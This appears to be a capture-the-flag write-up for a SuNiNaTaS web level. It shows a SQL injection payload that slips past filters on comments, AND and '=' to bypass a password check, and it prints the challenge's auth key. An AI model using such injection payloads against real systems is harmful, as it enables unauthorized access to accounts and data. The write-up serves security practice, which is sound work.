# Level 6   Simple SQLi

Challenge: [http://suninatas.com/challenge/web06/web06.asp](http://suninatas.com/challenge/web06/web06.asp)

![level-6.png](/assets/ctf/suninatas/web/level-6.png)

`README` opens a new tab [http://suninatas.com/challenge/web06/secret.asp](http://suninatas.com/challenge/web06/secret.asp)

![level-6-1.png](/assets/ctf/suninatas/web/level-6-1.png)

Query allows injection in `pwd` field.
```sql
SELECT szPwd FROM T_Web13 
WHERE nIdx = '3' AND szPwd = '{pwd}'
```

There are some filters applied, such as no comments, no `AND` and `=` from my testing.
Following payload worked:
```
' OR '1'<'2
```

![level-6-2.png](/assets/ctf/suninatas/web/level-6-2.png)

> Authkey: `suninatastopofworld!`

